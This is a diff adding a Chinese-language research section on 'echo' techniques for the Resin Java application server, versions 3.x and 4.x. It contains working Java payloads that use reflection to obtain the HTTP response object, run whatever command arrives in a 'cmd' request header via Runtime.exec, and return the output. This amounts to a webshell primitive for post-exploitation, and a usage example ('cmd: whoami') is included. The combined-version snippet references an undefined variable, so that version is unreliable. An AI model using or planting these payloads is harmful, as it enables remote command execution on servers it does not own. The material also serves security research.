@@ -3,6 +3,7 @@
 - 0x01-支持.jspf后缀
 - 0x02-类IIS6.0的解析漏洞
 - 0x03-Resin 4.0.36 信息泄露漏洞(ZSL-2013-5144)
+- 0x04-Resin 回显(已适配 3.x/4.x)
 
 
 ### 0x01-支持.jspf后缀
@@ -139,3 +140,269 @@ map方法将会对url路径进行正则表达式，然后根据匹配结果进�
 
 
 ![image](vulnerability-research.assets/144183814-9994ff06-4e7a-458b-92c1-c881e1834c82.png)
+
+### 回显
+
+
+#### Resin 4.x
+
+​		在resin 4.X中跟一下如何获取response对象
+
+- com.caucho.server.http.HttpRequest#handleRequest
+
+  ![image-20220105153754258](resinEcho.assets/image-20220105153754258.png)
+
+- com.caucho.server.http.AbstractHttpRequest#getResponseFacade
+
+  - 返回 response 对象
+
+  ![image-20220105153911823](resinEcho.assets/image-20220105153911823.png)
+
+  所以如果能获取到AbstractHttpRequest对象并调用该对象的getResponseFacade方法，即可获取response对象。
+
+​		获取AbstractHttpRequest对象，继承关系如下:
+
+> CTRL + H
+
+![image-20220105154711321](resinEcho.assets/image-20220105154711321.png)
+
+
+
+##### 基于 TcpSocketLink
+
+> com.caucho.network.listen.TcpSocketLink
+
+​		通过反射从`_currentRequest`获取到request对象
+
+![image-20220105155432966](resinEcho.assets/image-20220105155432966.png)
+
+![image-20220105155510412](resinEcho.assets/image-20220105155510412.png)
+
+​		测试发现实际上获取到的request对象为HttpRequest类型，而HttpRequest继承自`AbstractHttpRequest`，则可以调用getResponseFacade()方法获取response对象
+
+![image-20220105155805693](resinEcho.assets/image-20220105155805693.png)
+
+
+
+回显思路
+
+- 通过调用TcpSocketLink.getCurrentRequest()获取ProtocolConnection对象（实际HttpRequest）
+- 通过调用其父类(AbstractHttpRequest)的getResponseFacade方法获取response对象
+- 通过反射调用reponse对象的getWriter方法获取PrintWriter对象
+- 通过PrintWriter对象的write方法写入回显内容
+
+
+
+代码实现
+
+```java
+// 获取TcpSocketLink Class对象
+Class tcpSocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.network.listen.TcpSocketLink");
+// 通过反射调用getCurrentRequest方法 
+Method getCurrentRequestM = tcpSocketLinkClazz.getMethod("getCurrentRequest");
+Object currentRequest = getCurrentRequestM.invoke(null);
+// 从父类(AbstractHttpRequest)中获取_responseFacade字段
+Field f = currentRequest.getClass().getSuperclass().getDeclaredField("_responseFacade");
+f.setAccessible(true);
+// 获取response对象
+Object response = f.get(currentRequest);
+// 获取getWriter方法
+Method getWriterM = response.getClass().getMethod("getWriter");
+// 调用getWriter获取Writer对象
+Writer writer = (Writer)getWriterM.invoke(response);
+// 获取getHeader方法
+Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
+// 调用getHeader获取到通过需执行的命令：cmd
+String cmd = (String)getHeaderM.invoke(currentRequest, "cmd");
+// 执行命令
+Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
+// 写入命令执行结果并回显
+writer.write(scanner.hasNext() ? scanner.next() : "");
+```
+
+##### 基于 ServletInvocation
+
+- com.caucho.server.dispatch.ServletInvocation#getContextRequest
+
+  - 获取ContextRequest对象
+
+  ![image-20220105164537318](resinEcho.assets/image-20220105164537318.png)
+
+  - 实际获取到的为HttpServletRequestImpl对象
+
+    ![image-20220105170110241](resinEcho.assets/image-20220105170110241.png)
+
+- com.caucho.server.http.HttpServletRequestImpl#_response
+
+  - 获取到HttpServletRequestImpl对象后，通过_response字段获取到response对象。
+
+  ![image-20220105170219120](resinEcho.assets/image-20220105170219120.png)
+
+  - 运行时截图
+
+    ![image-20220105170612858](resinEcho.assets/image-20220105170612858.png)
+
+
+
+回显思路
+
+- 反射调用ServletInvocation.getContextRequest()获取HttpServletRequestImpl对象
+- 反射获取_response字段得到response对象
+- 反射调用reponse对象的getWriter方法获取PrintWriter对象
+- 通过PrintWriter对象的write方法写入需回显内容
+
+
+
+代码实现
+
+```java
+// 反射调用ServletInvocation.getContextRequest()获取HttpServletRequestImpl对象
+Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
+// 反射获取_response字段（response对象）
+Field _responseF = currentRequest.getClass().getDeclaredField("_response");
+_responseF.setAccessible(true);
+Object response = _responseF.get(currentRequest);
+// 获取getWriter方法
+Method getWriterM = response.getClass().getMethod("getWriter");
+// 调用getWriter获取Writer对象
+Writer writer = (Writer)getWriterM.invoke(response);
+// 获取getHeader方法
+Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
+// 调用getHeader获取到通过需执行的命令：cmd
+String cmd = (String)getHeaderM.invoke(currentRequest, "cmd");
+// 执行命令
+Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
+// 写入命令执行结果并回显
+writer.write(scanner.hasNext() ? scanner.next() : "");
+```
+
+#### Resin 3.x
+
+​	在resin 3.X中跟一下如何获取response对象
+
+- com.caucho.server.http.HttpRequest#handleRequest
+
+  ![image-20220105161112694](resinEcho.assets/image-20220105161112694.png)
+
+- com.caucho.server.connection.AbstractHttpRequest#_response
+
+  - response 对象
+
+  ![image-20220105161306990](resinEcho.assets/image-20220105161306990.png)
+
+  所以如果能获取到AbstractHttpRequest对象，则可以反射获取该对象的_response字段（即response对象）。
+
+  获取AbstractHttpRequest对象:
+
+  ​		查看该类的继承关系，继承关系如下：
+
+  > CTRL + H
+
+![image-20220105161712914](resinEcho.assets/image-20220105161712914.png)
+
+##### 基于 ServletInvocation
+
+> com.caucho.server.dispatch.ServletInvocation
+
+- com.caucho.server.dispatch.ServletInvocation#getContextRequest
+
+  - 返回ServletRequest对象
+
+  ![image-20220105161958196](resinEcho.assets/image-20220105161958196.png)
+
+  - 实际获取到的为HttpRequest对象
+
+    ![image-20220105171626526](resinEcho.assets/image-20220105171626526.png)
+
+- com.caucho.server.connection.AbstractHttpRequest#_response
+
+  - 获取到HttpRequest对象，由于HttpRequest类中并没有保存_response对象，需要从父类AbstractHttpRequest中获取。
+
+  ![image-20220105171905716](resinEcho.assets/image-20220105171905716.png)
+
+  - 运行时截图
+
+    ```
+    contextRequest.getClass().getSuperclass() -> com.caucho.server.connection.AbstractHttpRequest
+    ```
+
+    ![image-20220105172215180](resinEcho.assets/image-20220105172215180.png)
+
+
+
+回显思路
+
+- 反射调用ServletInvocation.getContextRequest()获取HttpRequest对象
+- 从父类AbstractHttpRequest中获取_response字段（response对象）
+- 通过反射调用reponse对象的getWriter方法获取PrintWriter对象
+- 通过PrintWriter对象的write方法写入需回显内容
+
+
+
+代码实现
+
+```java
+// 获取ServletInvocation Class对象，反射调用getContextRequest方法获取ServletRequest对象
+Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
+// 从父类AbstractHttpRequest中获取response对象
+Field _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");
+_responseF.setAccessible(true);
+Object response = _responseF.get(currentRequest);
+// 获取getWriter方法
+Method getWriterM = response.getClass().getMethod("getWriter");
+// 调用getWriter获取Writer对象
+Writer writer = (Writer)getWriterM.invoke(response);
+// 获取getHeader方法
+Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
+// 调用getHeader获取到通过需执行的命令：cmd
+String cmd = (String)getHeaderM.invoke(currentRequest, "cmd");
+// 执行命令
+Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
+// 写入命令执行结果并回显
+writer.write(scanner.hasNext() ? scanner.next() : "");
+```
+
+
+
+#### Resin 3.x & 4.x 
+
+> 多版本适配、已测试 3.1.16、4.0.65
+
+##### 基于 ServletInvocation
+
+> 细节参考以上
+
+代码实现
+
+```java
+Object currentRequest = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null);
+Field _responseF;
+if(currentRequest.getClass().getName().contains("com.caucho.server.http.HttpRequest")){
+    // 3.x 需要从父类中获取
+    _responseF = currentRequest.getClass().getSuperclass().getDeclaredField("_response");
+}else{
+    _responseF = currentRequest.getClass().getDeclaredField("_response");
+}
+_responseF.setAccessible(true);
+Object response = _responseF.get(currentRequest);
+Method getWriterM = response.getClass().getMethod("getWriter");
+Writer writer = (Writer)getWriterM.invoke(response);
+Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
+String cmd = (String)getHeaderM.invoke(contextRequest, "cmd");
+Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A");
+writer.write(scanner.hasNext() ? scanner.next() : "");
+```
+
+使用方法
+
+```http
+cmd: whoami
+```
+
+测试效果
+
+![image-20220105191416860](resinEcho.assets/image-20220105191416860.png)
+
+
+
+
